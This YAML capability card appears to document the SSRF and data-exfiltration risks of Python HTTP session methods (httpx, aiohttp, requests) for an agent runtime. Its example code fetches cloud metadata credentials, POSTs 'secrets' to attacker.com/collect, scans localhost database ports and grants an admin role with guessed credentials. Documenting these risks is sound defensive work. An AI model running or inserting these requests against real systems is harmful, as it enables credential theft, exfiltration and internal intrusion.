# httpx/aiohttp/requests session .get/.request

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-0e500f7601ce956d
api: httpx/aiohttp/requests session .get/.request
api_family: http.session.request-get
runtime:
  language: python
  ecosystem: python-runtime
  package: http
  version: legacy-source-bound
capability_class: network-egress
normative_authority: capability-facts-only
bound_sinks:
- httpx.Client.get
- httpx.Client.request
- httpx.AsyncClient.get
- httpx.AsyncClient.request
- aiohttp.ClientSession.get
- aiohttp.ClientSession.request
- requests.Session.get
- requests.Session.request
roles:
- role_id: destination-url
  description: Legacy controlled role destination-url.
  bindings:
  - expression: url
    caller_bindable: true
facets:
- facet_id: legacy-facet-ba6735f9
  capability: Make outbound HTTP/HTTPS requests to any attacker-specified URL, enabling full network egress from the process host.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-73cb0624
  capability: Reach any internet-facing service or API with arbitrary method, headers, query params, and body (on `.request()`).
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-526fcc34
  capability: Reach internal/RFC 1918 private-network addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) — classic SSRF vector.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-b6a12980
  capability: Reach link-local addresses including cloud metadata endpoints (169.254.169.254, metadata.google.internal, 100.100.100.200 for Alibaba Cloud, etc.), enabling cloud credential/role exfiltration.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-db4a87df
  capability: Reach IPv6-only internal services that may be less monitored than IPv4 equivalents.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-d64b0d3b
  capability: Reach localhost / loopback (127.0.0.0/8, ::1) — services bound only to localhost (Redis, databases, admin panels, Docker socket, unauthenticated internal APIs) are exposed.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-f60343cd
  capability: Reach the Docker socket via `http://localhost/var/run/docker.sock` or similar Unix-domain paths when the library or a custom transport adapter supports `http+unix://` or `unix://` schemes.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-67738620
  capability: Issue arbitrary HTTP methods via `.request(method, url)` — GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, CONNECT, TRACE, or any custom method string, including methods that may bypass reverse-proxy method-based restrictions.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-aa3a7869
  capability: Send attacker-controlled request bodies via `.request()` (params `content`, `data`, `files`, `json`), enabling data exfiltration via POST/PUT to attacker-controlled external servers.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-1b383c6a
  capability: Inject arbitrary HTTP headers via the `headers` parameter, enabling host-header injection, request smuggling precursors, or custom authentication headers.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-a88d4ad1
  capability: Set custom `Cookie` headers, enabling session fixation or credential-stuffing against internal services.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-c2bc426d
  capability: Supply authentication credentials via the `auth` parameter — Basic, Digest, Bearer token, or custom auth classes — enabling authenticated access to internal services when credentials are known or guessable.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-8a7ec61e
  capability: Follow HTTP redirects (3xx) automatically when `follow_redirects=True`, enabling redirect-based SSRF where an external URL redirects to an internal target — the library follows the redirect transparently and returns the internal response to the caller.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-303e903f
  capability: Disable TLS certificate verification via `verify=False`, enabling interception of HTTPS traffic by MITM proxies and suppressing certificate-mismatch errors that would otherwise block connections to services using self-signed or internal-PKI certificates.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-ee1e8af2
  capability: Route all traffic through an attacker-specified proxy via the `proxy` parameter, enabling traffic redirection through attacker-controlled infrastructure for inspection, modification, or logging of request/response data.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-d2a59705
  capability: Control connection timeout via the `timeout` parameter, enabling timing-based side-channel probing of internal services (fast timeout = port closed, slow = port open/service listening).
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-9df66253
  capability: Stream response bodies via the `.stream()` method or equivalent, enabling progressive exfiltration of large internal resources without buffering the full response in memory.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-f5268987
  capability: Read full response content (`.text`, `.content`, `.json()`, `.iter_bytes()`, `.iter_lines()`, `.iter_raw()`), enabling complete exfiltration of any HTTP-accessible internal resource.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-34a41a1f
  capability: Read response status code and headers, enabling reconnaissance of internal service availability, software versions (Server header), and configuration.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-f1ccb2fb
  capability: Perform DNS resolution at connect time (not at call-specification time), enabling DNS-rebinding attacks where a hostname resolves to a benign external IP during initial validation but to an internal IP when the actual connection is made (TOCTOU on DNS).
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-6a5c97e0
  capability: Connection pooling across targets when using a shared `Client`/`Session` instance — one successful connection to an internal host may keep the connection alive for subsequent requests, reducing detection latency.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-38d14323
  capability: HTTP/2 support (httpx `Client(http2=True)`) — multiplexed connections to internal targets, potentially bypassing HTTP/1.1-aware inspection.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-acd89ada
  role_id: null
  value: '`trust_env=True` by default: the library reads `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, and `PIP_CERT` from the process environment. An attacker who controls environment variables (or the agent runtime environment) can inject a proxy or custom CA without modifying any code path.'
  security_effect: '`trust_env=True` by default: the library reads `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, and `PIP_CERT` from the process environment. An attacker who controls environment variables (or the agent runtime environment) can inject a proxy or custom CA without modifying any code path.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-b3ccb121
  role_id: null
  value: '`follow_redirects=False` by default on module-level functions and `UseClientDefault` on Client instances — however when a Client is constructed with `follow_redirects=True`, ALL subsequent `.get()`/`.request()` calls inherit redirect-following unless explicitly overridden.'
  security_effect: '`follow_redirects=False` by default on module-level functions and `UseClientDefault` on Client instances — however when a Client is constructed with `follow_redirects=True`, ALL subsequent `.get()`/`.request()` calls inherit redirect-following unless explicitly overridden.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-437ab78d
  role_id: null
  value: '`verify=True` by default — TLS is enforced, but `trust_env=True` means custom CA bundles from environment variables are honored, potentially trusting attacker-controlled CAs.'
  security_effect: '`verify=True` by default — TLS is enforced, but `trust_env=True` means custom CA bundles from environment variables are honored, potentially trusting attacker-controlled CAs.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-ce4bb6f4
  role_id: null
  value: Default timeout is 5 seconds (`Timeout(timeout=5.0)`) — may be sufficient for LAN-speed internal requests but too short for some slow internal services, creating a natural timing side-channel.
  security_effect: Default timeout is 5 seconds (`Timeout(timeout=5.0)`) — may be sufficient for LAN-speed internal requests but too short for some slow internal services, creating a natural timing side-channel.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-212e875d
  role_id: null
  value: DNS resolution is performed by the operating system's resolver at connect time, not at URL construction time — this is the root of DNS rebinding / TOCTOU exploitability.
  security_effect: DNS resolution is performed by the operating system's resolver at connect time, not at URL construction time — this is the root of DNS rebinding / TOCTOU exploitability.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-16bcd77b
  role_id: null
  value: Connection reuse in pooled Clients/Sessions is automatic and transparent — a prior request to a different host on the same internal subnet may share TLS session tickets or connection state.
  security_effect: Connection reuse in pooled Clients/Sessions is automatic and transparent — a prior request to a different host on the same internal subnet may share TLS session tickets or connection state.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-aef4beb8
  role_id: null
  value: Response body is fully read and buffered by default (non-streaming mode), meaning the entire internal resource is pulled into memory before the caller can inspect it — this enables bulk data exfiltration with a single call.
  security_effect: Response body is fully read and buffered by default (non-streaming mode), meaning the entire internal resource is pulled into memory before the caller can inspect it — this enables bulk data exfiltration with a single call.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: 'import httpx

    client = httpx.Client()

    # Normal usage: fetch a public API

    resp = client.get("https://httpbin.org/get", params={"key": "value"})

    print(resp.json())

    '
  capability_edge: "import httpx\n\nclient = httpx.Client(verify=False, follow_redirects=True)\n\n# 1) Cloud metadata exfiltration (AWS / GCP / Azure / Alibaba)\nresp = client.get(\n    \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\n    headers={\"Host\": \"169.254.169.254\"},\n    timeout=3.0,\n)\nprint(resp.text)\n\n# 2) Internal service SSRF via redirect\nresp = client.get(\n    \"https://attacker.com/redirect-to-internal\",\n    follow_redirects=True,  # follows 302 to http://10.0.0.1/admin\n)\nprint(resp.status_code, resp.text[:200])\n\n# 3) Exfiltrate data to attacker-controlled server\nsecrets = \"exfiltrated-content\"\nclient.request(\n    \"POST\",\n    \"https://attacker.com/collect\",\n    data={\"data\": secrets},\n    headers={\"X-Exfil-Source\": \"hermes-agent\"},\n)\n\n# 4) Probe localhost services\nfor port in [6379, 5432, 3306, 27017, 8080, 9200]:\n    try:\n        r = client.get(f\"http://127.0.0.1:{port}/\", timeout=0.5)\n        print(f\"Port\
    \ {port} OPEN: {r.status_code}, headers={dict(r.headers)}\")\n    except Exception as e:\n        print(f\"Port {port} closed/timeout: {type(e).__name__}\")\n\n# 5) .request() with arbitrary method + body\nclient.request(\n    \"PUT\",\n    \"https://internal-api.corp/admin/users\",\n    json={\"role\": \"admin\"},\n    auth=httpx.BasicAuth(\"admin\", \"guessed-password\"),\n)\n"
provenance:
- https://www.python-httpx.org/api/#asyncclient
- https://www.python-httpx.org/quickstart/
- https://docs.aiohttp.org/en/stable/client_reference.html
- https://requests.readthedocs.io/en/latest/api/#requests.Session
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- https://cwe.mitre.org/data/definitions/918.html
```
